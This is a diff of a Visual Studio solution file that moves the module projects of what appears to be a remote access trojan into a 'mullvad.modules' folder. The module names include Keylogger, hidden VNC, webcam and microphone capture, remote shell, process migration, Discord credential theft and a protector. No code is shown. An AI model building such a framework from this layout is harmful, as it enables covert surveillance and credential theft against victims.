@@ -16,63 +16,63 @@ Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "mullvad.encryption", "mullv
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Managment", "Managment", "{14DA0662-5224-4363-ABBD-6A56B02047E2}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FileManager", "FileManager\FileManager.csproj", "{5056A407-82AE-41C6-A866-F7D3BDD44514}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FileManager", "mullvad.modules\FileManager\FileManager.csproj", "{5056A407-82AE-41C6-A866-F7D3BDD44514}"
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Information", "Information", "{B044CA8A-9F21-4B10-B192-6B6F59B88A90}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "SystemInformation", "SystemInformation\SystemInformation.csproj", "{4E1F1333-8227-4F9D-8001-7F61CC2E4E32}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "SystemInformation", "mullvad.modules\SystemInformation\SystemInformation.csproj", "{4E1F1333-8227-4F9D-8001-7F61CC2E4E32}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "AdvancedSystemInformation", "AdvancedSystemInformation\AdvancedSystemInformation.csproj", "{35789CB2-9651-4A19-A25D-82FA349D397B}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "AdvancedSystemInformation", "mullvad.modules\AdvancedSystemInformation\AdvancedSystemInformation.csproj", "{35789CB2-9651-4A19-A25D-82FA349D397B}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "NetworkInformation", "NetworkInformation\NetworkInformation.csproj", "{437BC91A-40B8-41DC-944A-164DD995D1F0}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "NetworkInformation", "mullvad.modules\NetworkInformation\NetworkInformation.csproj", "{437BC91A-40B8-41DC-944A-164DD995D1F0}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "TaskManager", "TaskManager\TaskManager.csproj", "{EBB56F57-A884-4825-AB69-92F5F2DA91A0}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "TaskManager", "mullvad.modules\TaskManager\TaskManager.csproj", "{EBB56F57-A884-4825-AB69-92F5F2DA91A0}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RegisteryEditor", "RegisteryEditor\RegisteryEditor.csproj", "{B91FBB15-A277-4C98-821A-9EE83EE45FF1}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RegisteryEditor", "mullvad.modules\RegisteryEditor\RegisteryEditor.csproj", "{B91FBB15-A277-4C98-821A-9EE83EE45FF1}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "StartupApplications", "StartupApplications\StartupApplications.csproj", "{5AD8E90F-E8FE-42A9-9C11-9301990ACC13}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "StartupApplications", "mullvad.modules\StartupApplications\StartupApplications.csproj", "{5AD8E90F-E8FE-42A9-9C11-9301990ACC13}"
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Surveillance", "Surveillance", "{CCF69E74-3EA3-4624-ACF9-32639664E62C}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteDesktop", "RemoteDesktop\RemoteDesktop.csproj", "{563D7262-21F2-4902-AF0C-E5A763591860}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteDesktop", "mullvad.modules\RemoteDesktop\RemoteDesktop.csproj", "{563D7262-21F2-4902-AF0C-E5A763591860}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteDesktop265", "RemoteDesktop265\RemoteDesktop265.csproj", "{EB8CD83B-3F8B-4F05-B3D9-9BB25BAC5F6B}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteDesktop265", "mullvad.modules\RemoteDesktop265\RemoteDesktop265.csproj", "{EB8CD83B-3F8B-4F05-B3D9-9BB25BAC5F6B}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Webcam", "Webcam\Webcam.csproj", "{C7E8F432-1A9B-4D2E-A6F3-8B5C92D41E7A}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Webcam", "mullvad.modules\Webcam\Webcam.csproj", "{C7E8F432-1A9B-4D2E-A6F3-8B5C92D41E7A}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteAudio", "RemoteAudio\RemoteAudio.csproj", "{D8F9A543-2BAC-5E3F-B7A4-9C6D03E52F8B}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteAudio", "mullvad.modules\RemoteAudio\RemoteAudio.csproj", "{D8F9A543-2BAC-5E3F-B7A4-9C6D03E52F8B}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteMicrophone", "RemoteMicrophone\RemoteMicrophone.csproj", "{0CA43E85-A384-4364-8442-FD1B302F81DD}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteMicrophone", "mullvad.modules\RemoteMicrophone\RemoteMicrophone.csproj", "{0CA43E85-A384-4364-8442-FD1B302F81DD}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Services", "Services\Services.csproj", "{3F865372-4DE5-48A5-8A62-803D48B90EA3}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Services", "mullvad.modules\Services\Services.csproj", "{3F865372-4DE5-48A5-8A62-803D48B90EA3}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Hvnc", "Hvnc\Hvnc.csproj", "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Hvnc", "mullvad.modules\Hvnc\Hvnc.csproj", "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Intellix", "Intellix\Intellix.csproj", "{4E810C82-7642-4CC5-9082-F6889DB44517}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Intellix", "mullvad.modules\Intellix\Intellix.csproj", "{4E810C82-7642-4CC5-9082-F6889DB44517}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Clipboard", "Clipboard\Clipboard.csproj", "{A2B3C4D5-E6F7-8901-BCDE-012345678901}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Clipboard", "mullvad.modules\Clipboard\Clipboard.csproj", "{A2B3C4D5-E6F7-8901-BCDE-012345678901}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "InstalledApplications", "InstalledApplications\InstalledApplications.csproj", "{F2A3B4C5-D6E7-8901-BCDE-F12345678901}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "InstalledApplications", "mullvad.modules\InstalledApplications\InstalledApplications.csproj", "{F2A3B4C5-D6E7-8901-BCDE-F12345678901}"
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Credentials", "Credentials", "{7A6A4E4C-ADEC-44CC-824F-AE43D8A28416}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Discord", "Discord\Discord.csproj", "{1F93817D-B3A0-4916-838A-458C2576E220}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Discord", "mullvad.modules\Discord\Discord.csproj", "{1F93817D-B3A0-4916-838A-458C2576E220}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "GeoLocation", "GeoLocation\GeoLocation.csproj", "{C4D5E6F7-A8B9-0123-CDEF-234567890123}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "GeoLocation", "mullvad.modules\GeoLocation\GeoLocation.csproj", "{C4D5E6F7-A8B9-0123-CDEF-234567890123}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "GpsExploit", "GpsExploit\GpsExploit.csproj", "{B2C3D4E5-F6A7-8901-BCDE-F01234567890}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "GpsExploit", "mullvad.modules\GpsExploit\GpsExploit.csproj", "{B2C3D4E5-F6A7-8901-BCDE-F01234567890}"
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "PostModules", "PostModules", "{A9B0C1D2-E3F4-5678-90AB-CDEF01234567}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "MigrateProcess", "MigrateProcess\MigrateProcess.csproj", "{D1E2F3A4-B5C6-7890-ABCD-EF0123456789}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "MigrateProcess", "mullvad.modules\MigrateProcess\MigrateProcess.csproj", "{D1E2F3A4-B5C6-7890-ABCD-EF0123456789}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "BrowserInspection", "BrowserInspection\BrowserInspection.csproj", "{E2F3A4B5-C6D7-8901-BCDE-F01234567890}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "BrowserInspection", "mullvad.modules\BrowserInspection\BrowserInspection.csproj", "{E2F3A4B5-C6D7-8901-BCDE-F01234567890}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "KeywordMonitor", "KeywordMonitor\KeywordMonitor.csproj", "{B2C3D4E5-F6A7-8901-BCDE-123456789ABC}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "KeywordMonitor", "mullvad.modules\KeywordMonitor\KeywordMonitor.csproj", "{B2C3D4E5-F6A7-8901-BCDE-123456789ABC}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteScripting", "RemoteScripting\RemoteScripting.csproj", "{C3D4E5F6-A7B8-9012-CDEF-345678901234}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteScripting", "mullvad.modules\RemoteScripting\RemoteScripting.csproj", "{C3D4E5F6-A7B8-9012-CDEF-345678901234}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger", "Keylogger\Keylogger.csproj", "{D4E5F6A7-B8C9-0123-ABCD-EF6789012345}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger", "mullvad.modules\Keylogger\Keylogger.csproj", "{D4E5F6A7-B8C9-0123-ABCD-EF6789012345}"
 EndProject
 Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "mullvad.protector", "mullvad.protector", "{F4A5B6C7-D8E9-0123-ABCD-EF4567890123}"
 EndProject
@@ -80,7 +80,7 @@ Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Mullvad.Protector.Core", "M
 EndProject
 Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Mullvad.Protector.CLI", "Mullvad.Protector.CLI\Mullvad.Protector.CLI.csproj", "{B5C6D7E8-F9A0-1234-BCDE-F67890123456}"
 EndProject
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteShell", "RemoteShell\RemoteShell.csproj", "{69BB1D83-090B-4A34-8C3F-3C63E071AAA5}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteShell", "mullvad.modules\RemoteShell\RemoteShell.csproj", "{69BB1D83-090B-4A34-8C3F-3C63E071AAA5}"
 EndProject
 Global
 	GlobalSection(SolutionConfigurationPlatforms) = preSolution
